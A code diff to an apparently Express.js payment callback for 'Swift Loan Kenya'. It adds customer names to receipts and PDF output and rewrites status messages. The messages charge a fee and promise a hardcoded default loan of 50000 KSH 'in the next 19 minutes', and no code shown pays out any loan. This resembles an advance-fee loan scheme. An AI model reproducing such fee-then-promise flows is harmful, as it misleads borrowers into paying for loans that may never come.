@@ -154,7 +154,7 @@ app.post("/pay", async (req, res) => {
   }
 });
 
-// 2️⃣ Callback handler
+  // 2️⃣ Callback handler
 app.post("/callback", (req, res) => {
   console.log("Callback received:", req.body);
 
@@ -163,8 +163,15 @@ app.post("/callback", (req, res) => {
   let receipts = readReceipts();
   const existingReceipt = receipts[ref] || {};
 
+  // Normalize status
   const status = data.status?.toLowerCase();
   const resultCode = data.result?.ResultCode;
+
+  // Try to build customer name from result
+  const customerName = data.result?.Name 
+    || [data.result?.FirstName, data.result?.MiddleName, data.result?.LastName].filter(Boolean).join(" ")
+    || existingReceipt.customer_name
+    || "N/A";
 
   if ((status === "completed" && data.success === true) || resultCode === 0) {
     receipts[ref] = {
@@ -174,8 +181,9 @@ app.post("/callback", (req, res) => {
       amount: data.result?.Amount || existingReceipt.amount || null,
       loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
+      customer_name: customerName,   // ✅ store name
       status: "success",
-      status_note: `Loan withdrawal is successful and the fee was accepted.`,
+      status_note: `Loan withdrawal is successful and the fee was accepted. You will receive the applied loan amount in the next 19 minutes.\n\nRegards Swift Loan Kenya 🇰🇪`,
       timestamp: data.timestamp || new Date().toISOString(),
     };
   } else {
@@ -186,14 +194,16 @@ app.post("/callback", (req, res) => {
       amount: data.result?.Amount || existingReceipt.amount || null,
       loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
+      customer_name: customerName,   // ✅ keep name even in failed/cancelled
       status: "cancelled",
-      status_note: data.result?.ResultDesc || "Payment was cancelled or failed.",
+      status_note: data.result?.ResultDesc || "Payment was cancelled or failed. Your loan will remain on hold (expire) for 24 hours and will not be withdrawn. Retry or contact customer care for assistance.",
       timestamp: data.timestamp || new Date().toISOString(),
     };
   }
 
   writeReceipts(receipts);
 
+  // Must always return 200
   res.json({ ResultCode: 0, ResultDesc: "Success" });
 });
 
@@ -263,15 +273,16 @@ function generateReceiptPDF(receipt, res) {
   doc.moveDown();
 
   const details = [
-    ["Reference", receipt.reference],
-    ["Transaction ID", receipt.transaction_id || "N/A"],
-    ["Transaction Code", receipt.transaction_code || "N/A"],
-    ["Fee Amount", `KSH ${receipt.amount}`],
-    ["Loan Amount", `KSH ${receipt.loan_amount}`],
-    ["Phone", receipt.phone],
-    ["Status", receipt.status.toUpperCase()],
-    ["Time", new Date(receipt.timestamp).toLocaleString()],
-  ];
+  ["Reference", receipt.reference],
+  ["Transaction ID", receipt.transaction_id || "N/A"],
+  ["Transaction Code", receipt.transaction_code || "N/A"],
+  ["Fee Amount", `KSH ${receipt.amount}`],
+  ["Loan Amount", `KSH ${receipt.loan_amount}`],
+  ["Phone", receipt.phone],
+  ["Customer Name", receipt.customer_name || "N/A"],   // ✅ new line
+  ["Status", receipt.status.toUpperCase()],
+  ["Time", new Date(receipt.timestamp).toLocaleString()],
+];
 
   details.forEach(([key, value]) => {
     doc.fontSize(12).text(`${key}: `, { continued: true }).text(value);
